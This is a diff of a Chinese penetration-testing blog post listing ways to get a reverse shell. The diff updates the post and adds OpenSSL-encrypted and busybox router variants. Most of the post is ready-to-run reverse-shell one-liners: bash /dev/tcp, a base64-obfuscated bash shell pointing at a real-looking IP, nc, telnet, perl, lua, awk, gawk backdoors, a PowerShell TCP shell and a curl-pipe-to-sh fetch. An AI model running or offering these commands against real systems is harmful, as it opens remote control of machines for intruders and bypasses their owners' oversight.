@@ -131,7 +131,8 @@
 <meta property="og:description" content="主要反弹方式 首先vps监听：nc –l –vv –p port">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://n-b.oss-cn-beijing.aliyuncs.com/18.2.jpg">
-<meta property="og:updated_time" content="2019-09-15T14:12:45.190Z">
+<meta property="og:image" content="https://n-b.oss-cn-beijing.aliyuncs.com/18.3.png">
+<meta property="og:updated_time" content="2020-04-10T09:31:37.493Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="内网渗透之反弹shell的几种姿势">
 <meta name="twitter:description" content="主要反弹方式 首先vps监听：nc –l –vv –p port">
@@ -497,7 +498,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-09-15 22:12:45" itemprop="dateModified" datetime="2019-09-15T22:12:45+08:00">2019-09-15</time>
+                <time title="Modified: 2020-04-10 17:31:37" itemprop="dateModified" datetime="2020-04-10T17:31:37+08:00">2020-04-10</time>
               
             
           </span>
@@ -552,7 +553,7 @@
         <h3 id="主要反弹方式"><a href="#主要反弹方式" class="headerlink" title="主要反弹方式"></a>主要反弹方式</h3><blockquote>
 <p>首先vps监听：<code>nc –l –vv –p port</code><a id="more"></a></p>
 </blockquote>
-<p><strong>1.bash反弹</strong><br>利用系统特殊设备文件/dev/tcp建立socket发出去，达到反弹shell的效果<br><code>bash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code></p>
+<p><strong>1.bash反弹</strong><br>利用系统特殊设备文件/dev/tcp建立socket发出去，达到反弹shell的效果<br><code>bash -i&gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</code><br>大部分Linux系统可用，但某些iot设备不存在bash无法反弹；存在&gt;、&amp;富豪在对符号处理的情况下无效。</p>
 <p><code>bash -c {echo,IGJhc2ggLWkgPiYgL2Rldi90Y3AvNDUuMzIuMjE5LjI0Mi85MTkxIDAgPiYx==}|{base64,-d}|{bash,-i}</code></p>
 <p><strong>2.telnet反弹</strong><br>适用于nc不可用或者/dev/tcp不可用条件下，其中mknod是创建设备文件<br><code>mknod test p &amp;&amp; telnet ip port 0&lt;test | /bin/bash 1&gt;test</code></p>
 <p><code>telnet ip port | /bin/bash | telnet ip port</code></p>
@@ -566,9 +567,10 @@
 <p>不依赖于/bin/sh的shell：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e &apos;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&apos;</span><br></pre></td></tr></table></figure></p>
 <p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/18.2.jpg" alt="18-1"></p>
 <p><strong>8.nc</strong><br>linux：<code>nc -e /bin/sh ip port</code><br>Windows：<code>nc -e cmd.exe ip port</code><br>当不能使用-e参数时：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mknod backpipe p &amp;&amp; nc ip port 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="line">/bin/sh | nc ip port</span><br><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; nc ip port 0/tmp/</span><br></pre></td></tr></table></figure></p>
-<p>nc版本有问题时：<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</code></p>
+<p>nc版本有问题时：<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc ip port &gt;/tmp/f</code><br>对不具有反向链接的nc版本：<br><code>nc ip port1 |/bin/bash|nc ip port2</code><br>利用port1传入内容给bash执行,port2传出。</p>
 <p>其他方式：<br><code>/sbin/busybox nc ip port -e /bin/bash</code></p>
 <p><code>/bin/bash -i &gt; /dev/tcp/ip/prot 0&lt;&amp;1 2&gt;&amp;1</code></p>
+<p>针对某些mips架构或busybox系统的路由器或终端：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//锐捷</span><br><span class="line">mkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | nc 127.0.0.1 6666 1&gt;/tmp/backpipe1</span><br><span class="line"></span><br><span class="line">//飞鱼星反弹shell</span><br><span class="line">mkfifo /tmp/backpipe1 | /bin/sh 0&lt;/tmp/backpipe1 | /bin/busybox nc 127.0.0.1 6666 1&gt;/tmp/backpipe1</span><br><span class="line"></span><br><span class="line">learning from 孙涛(红队实战攻防技术分享：Linux后门总结-SSH利用篇</span><br><span class="line">原创)</span><br></pre></td></tr></table></figure></p>
 <p><strong>9.lua</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;ip&apos;,&apos;port&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure></p>
 <p><strong>10.gawk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/gawk -f</span><br><span class="line"></span><br><span class="line">BEGIN &#123;</span><br><span class="line">        Port    =       8080</span><br><span class="line">        Prompt  =       &quot;bkd&gt; &quot;</span><br><span class="line"></span><br><span class="line">        Service = &quot;/inet/tcp/&quot; Port &quot;/0/0&quot;</span><br><span class="line">        while (1) &#123;</span><br><span class="line">                do &#123;</span><br><span class="line">                        printf Prompt |&amp; Service</span><br><span class="line">                        Service |&amp; getline cmd</span><br><span class="line">                        if (cmd) &#123;</span><br><span class="line">                                while ((cmd |&amp; getline) &gt; 0)</span><br><span class="line">                                        print $0 |&amp; Service</span><br><span class="line">                                close(cmd)</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; while (cmd != &quot;exit&quot;)</span><br><span class="line">                close(Service)</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p><strong>11、awk</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &apos;BEGIN&#123;s=&quot;/inet/tcp/0/192.168.1.128/8080&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&apos;</span><br></pre></td></tr></table></figure></p>
@@ -576,6 +578,8 @@
 <p><code>curl https://x.x.sh/ip:port | sh</code></p>
 <p><code>powershell -nop -c &quot;$client = New-Object Net.Sockets.TCPClient(&#39;1.1.1.1&#39;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.UTF8Encoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte = ([text.encoding]::UTF8).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;</code></p>
 <p><code>nc 无法接收到shell可尝试使用ncat接收</code></p>
+<p>使用Openssl加密反弹shell流量：<br>1、在vps上生成SSL证书的公钥/私钥对<br>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes<br>2、openssl s_server -quiet -key key.pem -cert cert.pem -port 81</p>
+<p>3、在目标机器上用openssl反弹加密shell<br>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.80.137:81 &gt; /tmp/s; rm /tmp/s<br><img src="https://n-b.oss-cn-beijing.aliyuncs.com/18.3.png" alt="18.3"></p>
 <p>参考链接：<br><span class="exturl" data-url="aHR0cDovL3d3dy5mcmVlYnVmLmNvbS9hcnRpY2xlcy9zeXN0ZW0vMTQ3NzY4Lmh0bWw=" title="http://www.freebuf.com/articles/system/147768.html">http://www.freebuf.com/articles/system/147768.html<i class="fa fa-external-link"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcjAwdGdyb2svcC9yZXZlcnNlX3NoZWxsX2NoZWF0c2hlZXQuaHRtbA==" title="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html<i class="fa fa-external-link"></i></span></p>
 
       
@@ -757,7 +761,7 @@
                 
                   <a href="/archives">
                 
-                    <span class="site-state-item-count">40</span>
+                    <span class="site-state-item-count">39</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
